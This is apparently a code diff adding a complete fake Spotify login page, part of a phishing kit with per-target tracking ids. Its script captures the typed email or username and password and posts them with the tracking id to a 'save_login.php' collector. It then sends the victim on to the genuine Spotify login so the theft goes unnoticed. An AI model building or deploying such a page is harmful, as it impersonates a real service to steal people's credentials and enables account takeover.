@@ -1,0 +1,41 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login - Spotify</title><style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#121212;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:450px;text-align:center}
+.sp{font-size:40px;font-weight:900;color:#1ed760;letter-spacing:-1px;margin-bottom:32px}
+h1{color:#fff;font-size:32px;font-weight:700;margin-bottom:32px}
+input{width:100%;max-width:400px;height:48px;border:1px solid #727272;border-radius:4px;background:#121212;color:#fff;padding:0 14px;margin:0 auto 12px;display:block;font-size:15px}
+.btn-submit{width:100%;max-width:400px;height:48px;background:#1ed760;color:#000;border:none;border-radius:500px;font-weight:700;font-size:16px;cursor:pointer;margin:16px auto 0;display:block}
+</style></head><body><div class="card"><div class="sp">Spotify</div><h1>Log in to continue.</h1><form id="loginForm"><input type="text" id="email" placeholder="Email or username" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log In</button></form></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script>
+(function(){
+var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+    var login = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
+    var btn = document.querySelector(".btn-submit");
+    var label = btn.textContent;
+    btn.textContent = "Please wait…";
+    btn.disabled = true;
+    $.ajax({
+        type: "POST",
+        url: BASE_URL + "save_login.php",
+        data: { tid: tid, login: login, password: password, template: "spotify" },
+        dataType: "json",
+        success: function (data) {
+            if (data && data.ok) { window.location.href = "https:\/\/accounts.spotify.com\/login"; return; }
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        },
+        error: function () {
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        }
+    });
+});
+})();
+</script></body></html>
